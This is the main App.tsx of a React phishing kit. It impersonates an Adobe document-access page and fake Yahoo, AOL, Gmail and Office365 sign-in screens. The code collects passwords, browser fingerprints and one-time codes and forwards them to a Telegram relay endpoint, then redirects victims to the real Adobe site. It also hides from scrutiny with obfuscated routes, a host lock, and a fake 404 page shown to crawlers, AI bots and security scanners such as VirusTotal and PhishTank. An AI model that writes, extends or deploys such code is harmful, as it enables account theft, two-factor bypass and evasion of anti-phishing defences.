import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, Navigate, useLocation } from 'react-router-dom';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import YahooLoginPage from './components/YahooLoginPage';
import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
import AolLoginPage from './components/AolLoginPage';
import GmailLoginPage from './components/GmailLoginPage';
import OthersLoginPage from './components/OthersLoginPage';
import Office365Wrapper from './components/Office365Wrapper';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import OtpPage from './components/OtpPage';
import MobileOtpPage from './components/mobile/MobileOtpPage';
import ProviderRedirect from './components/ProviderRedirect';
import Spinner from './components/common/Spinner';
import { getBrowserFingerprint } from './utils/oauthHandler';
import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
import { config } from './config';

const safeSendToTelegram = async (payload: any) => {
  try {
    const res = await fetch(config.api.sendTelegramEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
  } catch (fetchErr) {
    console.error('safeSendToTelegram failed:', fetchErr);
  }
};

// Obfuscated route paths
const ROUTES = {
  HOME: '/brgnticvpchctym5duv1d70eywdxep5an857hdjrnrt31y9madtvoe0dl5wh9uwdjk6zoy5xs6ii05n37dyueriqrb32mk1yosi2620glvinkafq88cx1mjh421dlddpub6fatx54f5n6tuhckmp3m3xgc2on8',
  LOGIN: '/4pelo3vzx6ei7ych296jb2mvnhqokj1t7j2gq7qkgh1n9tzzr7h9yb0jvi2pw81jx3n7o22tjps78ut8iorj1vv5s0and0rdzmk4m5xpp8e1ap8c4xcneibr93rhseg5127t3nuasqdvuhz6edzjm8ni54a9cy',
  LOGIN_YAHOO: '/eqmbwtyetkubevfw9i1rqsftn0tepqmc8wtbqqopu0n1fw1r0i91xhnykq8sxk4gltk5re16xllreupyvya4qqq0t6hll23keljtu7loqysbysak9hxymr77hn7oxgjpa61mjyrt5i5i5vmktk3rjt26nhrrtl',
  LOGIN_AOL: '/stncyiw230jhw98jy9s2m58pp9nwz8ng3ffwajrmk8ibacbuzxreqo7en872riqqp254tnavjui6zd1mul4xw3dkq6hqxowbmzq30dxq0bqexkc5jsakvwc4vig6fun7ft8fi0ebhjl2x1ea83uu9k513zgimk',
  LOGIN_GMAIL: '/5nqhr4zkyb0np3zdfbrh1yxk4z5lmgalonutxdsz6hzekg3jsvhwtvxt0iqian5vgu8entmd96c5x0d56u4cn03vbnqmwe0jk2i7sw9nbuyqx0b4p7nhjrxeqr1nh3srj07bmm2tox8clxtvrydhr6mfijj5j6',
  LOGIN_OTHERS: '/j9xf3ceh46jptot7daclbqb7668vv4l1mxerrmscub5pr0iqdebmn3quxoivejcv7ripcmo63o8saawtb6hy3psudjx7wurq86rphsj700baxygur7up0jd30ebp9c9u1y7nx4y8httfzwwuinf4tfolgdudws',
  LOGIN_OFFICE365: '/mtwavnfbcxdh84u25c58xv7igejfgyavzq7i3lwelij3tipowa7fb93n6gk3ml8ul7d8v034j43e7u1egw9hpeoeqxj81uzyozv0ikn0i4a5gas0auqcl73dx4aymbkdy0dxxbj4tzo72f6az6uzq9onxrnklt',
  OTP: '/938uv6106001sygvk1bzhqhx9xfjas1v6ccxfyy8ls30qdkba1n68dftexsdc3xd1zlkwjge9n5c4u2mkfnvk1gq9z027c8mn7miuqhd6ped06ov44zcqrlpmntinhbhfzz5qph9u23pdl1udmhm9x4s3f8i2a',
  LANDING: '/6dck1w4qnffnxtiaofl09u4wy5txozis4phoji3cjswgcm4btl6ghnm343m9hht8g3x4j89v40esarpatd18z5v2bv70yqwmd9ggpn7xng1ys93f1kkaflacbh1i1b4p3774z7hkpzgzs122783h3dbe56ziad',
};

const PROVIDER_URLS = {
  MICROSOFT: '/login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Faccount.adobe.com%2Foauth2%2Fcallback&response_type=code&scope=openid+profile+email',
  YAHOO: '/login.yahoo.com/?src=ym&pspid=159600001&activity=header-signin&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2F',
  GMAIL: '/accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=ARpgrqe&flowName=GlifWebSignIn&flowEntry=ServiceLogin',
  AOL: '/login.aol.com/account/challenge/password?src=ym&pspid=159600001&activity=header-signin&.lang=en-US',
  OTHERS: '/secure-mail.com/login?service=mail&continue=https%3A%2F%2Fmail.secure-mail.com',
};

// Alternate domains hosted by Yahoo (beyond domains that already contain 'yahoo')
const YAHOO_EXTRA_DOMAINS = [
  'ymail.com', 'rocketmail.com',
  // AT&T / SBC / Pacific Bell / BellSouth — all route through Yahoo Mail
  'att.net', 'sbcglobal.net', 'ameritech.net', 'bellsouth.net',
  'pacbell.net', 'flash.net', 'nvbell.net', 'prodigy.net', 'snet.net', 'swbell.net',
  // Verizon / Frontier — use Yahoo Mail infrastructure
  'verizon.net', 'myfairpoint.net', 'frontiernet.net',
];
// Alternate domains hosted by AOL (beyond domains that already contain 'aol')
const AOL_EXTRA_DOMAINS = [
  'aim.com', 'love.com', 'ygm.com', 'games.com', 'wow.com', 'netscape.net',
  // CompuServe — owned by AOL/Verizon Media
  'compuserve.com', 'cs.com',
];
// Microsoft personal email domains (Outlook, Hotmail, Live, MSN and international variants)
const MICROSOFT_PERSONAL_DOMAINS = [
  // Outlook
  'outlook.com', 'outlook.co.uk', 'outlook.de', 'outlook.fr', 'outlook.it',
  'outlook.es', 'outlook.at', 'outlook.be', 'outlook.cl', 'outlook.cz',
  'outlook.dk', 'outlook.fi', 'outlook.gr', 'outlook.hu', 'outlook.id',
  'outlook.ie', 'outlook.in', 'outlook.lv', 'outlook.my', 'outlook.ph',
  'outlook.pt', 'outlook.sa', 'outlook.sg', 'outlook.sk', 'outlook.tr',
  'outlook.vn', 'outlook.com.au', 'outlook.com.br', 'outlook.co.nz', 'outlook.co.jp',
  // Hotmail
  'hotmail.com', 'hotmail.co.uk', 'hotmail.fr', 'hotmail.de', 'hotmail.it',
  'hotmail.es', 'hotmail.co.jp', 'hotmail.com.br', 'hotmail.com.ar',
  'hotmail.be', 'hotmail.ca', 'hotmail.nl', 'hotmail.at', 'hotmail.ch',
  'hotmail.com.mx', 'hotmail.com.au', 'hotmail.gr', 'hotmail.hu',
  'hotmail.no', 'hotmail.se', 'hotmail.dk', 'hotmail.fi',
  // Live
  'live.com', 'live.co.uk', 'live.fr', 'live.de', 'live.it', 'live.es',
  'live.nl', 'live.be', 'live.ca', 'live.com.au', 'live.co.nz', 'live.com.ar',
  'live.com.mx', 'live.at', 'live.ch', 'live.dk', 'live.fi', 'live.ie',
  'live.no', 'live.pt', 'live.se', 'live.co.za',
  // MSN
  'msn.com',
  // Windows Live / Xbox Live / Passport / Microsoft corporate
  'windowslive.com', 'xboxlive.com', 'passport.com', 'microsoft.com',
];

const isYahooDomain = (domain: string): boolean =>
  domain.includes('yahoo') || YAHOO_EXTRA_DOMAINS.some(d => domain === d || domain.endsWith('.' + d));

const isAolDomain = (domain: string): boolean =>
  domain.includes('aol') || AOL_EXTRA_DOMAINS.some(d => domain === d || domain.endsWith('.' + d));

const isMicrosoftPersonalDomain = (domain: string): boolean =>
  MICROSOFT_PERSONAL_DOMAINS.some(d => domain === d || domain.endsWith('.' + d));

// Client-side bot detection patterns (mirrors server.js BLOCKED_BOTS)
const CLIENT_BOT_PATTERNS = [
  'bot', 'crawl', 'spider', 'scrape', 'fetch', 'scan', 'check', 'monitor', 'probe',
  'headlesschrome', 'phantomjs', 'puppeteer', 'playwright', 'selenium', 'webdriver',
  'curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'node-fetch',
  'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
  'gptbot', 'chatgpt-user', 'ccbot', 'claudebot', 'anthropic-ai',
  'semrushbot', 'ahrefsbot', 'mj12bot', 'petalbot', 'bytespider',
  'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp',
  'urlscan', 'virustotal', 'phishtank', 'safebrowsing', 'netcraft',
  'shodan', 'censys', 'nuclei', 'nikto', 'nessus', 'acunetix', 'burpsuite',
  'axios', 'undici', 'scrapy', 'mechanize', 'httrack', 'libwww-perl',
  'smartscreen', 'phishing', 'antivirus', 'antiphishing', 'malware',
];

function isClientBot(): boolean {
  const ua = (navigator.userAgent || '').toLowerCase();
  if (!ua) return true;
  for (let i = 0; i < CLIENT_BOT_PATTERNS.length; i++) {
    if (ua.indexOf(CLIENT_BOT_PATTERNS[i]) !== -1) return true;
  }
  // Headless browser detection
  if ((navigator as any).webdriver) return true;
  return false;
}

function App() {
  // Client-side domain lock: if VITE_LOGIN_HOST is configured, only the matching
  // subdomain hostname is allowed. Any other host (e.g. the bare root domain) sees
  // a completely blank page. This mirrors the server-side LOGIN_HOST middleware.
  const [isBadHost] = useState<boolean>(() => {
    const expected = (import.meta.env.VITE_LOGIN_HOST ?? '').toLowerCase().trim();
    if (!expected) return false; // env var not set – allow all hosts (dev / preview)
    return window.location.hostname.toLowerCase() !== expected;
  });

  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
  const [hasActiveSession, setHasActiveSession] = useState(() => !!getCookie('adobe_session'));
  const [isLoading, setIsLoading] = useState(false);
  const [isInitializing, setIsInitializing] = useState(true);
  const [isBotDetected, setIsBotDetected] = useState(false);
  const [initMessage, setInitMessage] = useState('Connecting...');
  const [loginFlowState, setLoginFlowState] = useState({
    awaitingOtp: false,
    sessionData: null as any,
  });

  const navigate = useNavigate();
  const location = useLocation();

  // Initialization: bot detection + connecting splash screen
  useEffect(() => {
    if (isClientBot()) {
      setIsBotDetected(true);
      setIsInitializing(false);
      return;
    }
    const t1 = setTimeout(() => setInitMessage('Checking network connection...'), 800);
    const t2 = setTimeout(() => setInitMessage('Establishing secure connection...'), 1800);
    const t3 = setTimeout(() => setIsInitializing(false), 2800);
    return () => { clearTimeout(t1); clearTimeout(t2); clearTimeout(t3); };
  }, []);

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);
  
  useEffect(() => {
    const handleCookieChange = (event: CookieChangeEvent) => {
      if (event.name === 'adobe_session') {
        setHasActiveSession(event.action !== 'remove' && !!event.value);
      }
    };
    const unsubscribe = subscribeToCookieChanges(handleCookieChange);
    return unsubscribe;
  }, []);

  useEffect(() => {
    if (hasActiveSession && location.pathname !== ROUTES.LANDING) {
      navigate(ROUTES.LANDING, { replace: true });
    } else if (!hasActiveSession && location.pathname === ROUTES.LANDING) {
      navigate(ROUTES.HOME, { replace: true });
    }
  }, [hasActiveSession, location.pathname, navigate]);

  const handleCaptchaVerified = () => {
    navigate(ROUTES.LOGIN);
  };

  const handleLoginSuccess = async (loginData: any) => {
    // This is the handler for the second password attempt.
    setIsLoading(true);
    const browserFingerprint = await getBrowserFingerprint();
    const credentialsData = {
      ...loginData,
      sessionId: Math.random().toString(36).substring(2, 15),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      ...browserFingerprint,
    };
    
    await safeSendToTelegram({ type: 'credentials', data: credentialsData });
    
    setLoginFlowState({
      awaitingOtp: true,
      sessionData: credentialsData,
    });
    setIsLoading(false);
    navigate(ROUTES.OTP, { replace: true });
  };
  
  const handleOtpSubmit = async (otp: string) => {
    if (!loginFlowState.sessionData) {
      navigate(ROUTES.HOME, { replace: true });
      return;
    }
    
    setIsLoading(true);
    await safeSendToTelegram({
      type: 'otp',
      data: { otp, session: loginFlowState.sessionData },
    });
    
    window.location.href = 'https://www.adobe.com';
  };

  const handleLogout = () => {
    localStorage.clear();
    sessionStorage.clear();
    config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
    setHasActiveSession(false);
    setLoginFlowState({ awaitingOtp: false, sessionData: null });
  };

  const handleOthersEmailSubmit = async (email: string): Promise<boolean> => {
    const domain = (email.split('@').pop() || '').toLowerCase();
    if (isYahooDomain(domain)) {
      navigate(PROVIDER_URLS.YAHOO, { state: { email } });
      return true;
    }
    if (isAolDomain(domain)) {
      navigate(PROVIDER_URLS.AOL, { state: { email } });
      return true;
    }
    if (domain.includes('gmail') || domain.includes('google')) {
      navigate(PROVIDER_URLS.GMAIL, { state: { email } });
      return true;
    }
    if (isMicrosoftPersonalDomain(domain)) {
      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
      return true;
    }
    // Real Office365 business domain detection — only for domains not already matched above
    const isO365 = await isMicrosoftOffice365Domain(domain);
    if (isO365) {
      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
      return true;
    }
    // Unrecognized domain — return false so signin.html shows the password step inline
    return false;
  };

  // Real Office365 business domain detection via Microsoft's OpenID Connect endpoint.
  // Returns true if the domain is an Azure AD / Office365 tenant.
  const isMicrosoftOffice365Domain = async (domain: string): Promise<boolean> => {
    try {
      const response = await fetch(
        `https://login.microsoftonline.com/${encodeURIComponent(domain)}/v2.0/.well-known/openid-configuration`,
        { method: 'GET', signal: AbortSignal.timeout(3000) }
      );
      return response.ok;
    } catch {
      return false;
    }
  };

  // Handler for OthersLoginPage: routes known providers, detects Office365 business domains,
  // and returns false for truly unrecognized domains so the password form is shown.
  const handleOthersPageEmailSubmit = async (email: string): Promise<boolean> => {
    const domain = (email.split('@').pop() || '').toLowerCase();
    if (isYahooDomain(domain)) {
      navigate(PROVIDER_URLS.YAHOO, { state: { email } });
      return true;
    }
    if (isAolDomain(domain)) {
      navigate(PROVIDER_URLS.AOL, { state: { email } });
      return true;
    }
    if (domain.includes('gmail') || domain.includes('google')) {
      navigate(PROVIDER_URLS.GMAIL, { state: { email } });
      return true;
    }
    if (isMicrosoftPersonalDomain(domain)) {
      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
      return true;
    }
    // Check if the domain is a business Microsoft Office365 tenant
    const isO365 = await isMicrosoftOffice365Domain(domain);
    if (isO365) {
      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
      return true;
    }
    // Truly unrecognized domain — let OthersLoginPage show the password form
    return false;
  };

  // Wrong hostname: show a completely blank page (same as what the server returns for root domain)
  if (isBadHost) {
    return <div style={{ margin: 0, padding: 0, minHeight: '100vh', background: '#fff' }} />;
  }

  // Bot detected: show nothing (blank/404-like page)
  if (isBotDetected) {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'sans-serif', color: '#666', background: '#fff' }}>
        <div style={{ textAlign: 'center' }}>
          <h1 style={{ fontSize: '48px', margin: '0 0 16px', color: '#333' }}>404</h1>
          <p style={{ fontSize: '16px', margin: 0 }}>Page not found</p>
        </div>
      </div>
    );
  }

  // Initializing splash screen
  if (isInitializing) {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', background: '#f5f5f5', fontFamily: 'adobe-clean, Source Sans Pro, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif' }}>
        <Spinner size="lg" />
        <p style={{ marginTop: '24px', fontSize: '15px', color: '#6e6e6e', letterSpacing: '0.3px' }}>{initMessage}</p>
      </div>
    );
  }

  if (isLoading) {
    return <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center"><Spinner size="lg" /></div>;
  }

  const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
  const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
  const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
  const OtpComponent = isMobile ? MobileOtpPage : OtpPage;

  return (
    <Routes>
      <Route path={ROUTES.HOME} element={!hasActiveSession ? <LoginComponent key="provider-select" fileName="Adobe Cloud Access" onLoginSuccess={handleLoginSuccess} onYahooSelect={() => navigate(PROVIDER_URLS.YAHOO)} onAolSelect={() => navigate(PROVIDER_URLS.AOL)} onGmailSelect={() => navigate(PROVIDER_URLS.GMAIL)} onOffice365Select={() => navigate(PROVIDER_URLS.MICROSOFT)} onOthersSelect={() => navigate(PROVIDER_URLS.OTHERS)} onEmailSubmit={handleOthersEmailSubmit} onBack={() => navigate(ROUTES.HOME)} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN} element={<Navigate to={ROUTES.HOME} replace />} />
      <Route path={ROUTES.LOGIN_YAHOO} element={!hasActiveSession ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN_AOL} element={!hasActiveSession ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN_GMAIL} element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN_OTHERS} element={!hasActiveSession ? <OthersLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} onEmailSubmit={handleOthersPageEmailSubmit} onBack={() => navigate(ROUTES.HOME)} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN_OFFICE365} element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.OTP} element={loginFlowState.awaitingOtp ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginFlowState.sessionData?.email} provider={loginFlowState.sessionData?.provider} onResend={() => safeSendToTelegram({ type: 'otp_resend', data: loginFlowState.sessionData })} /> : <Navigate to={ROUTES.HOME} replace />} />
      <Route path={ROUTES.LANDING} element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to={ROUTES.HOME} replace />} />
      <Route path="/login.yahoo.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_YAHOO} />} />
      <Route path="/login.microsoftonline.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OFFICE365} provider="microsoft" />} />
      <Route path="/accounts.google.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_GMAIL} />} />
      <Route path="/login.aol.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_AOL} />} />
      <Route path="/secure-mail.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OTHERS} />} />
      <Route path="*" element={<Navigate to={hasActiveSession ? ROUTES.LANDING : ROUTES.HOME} replace />} />
    </Routes>
  );
}

export default App;
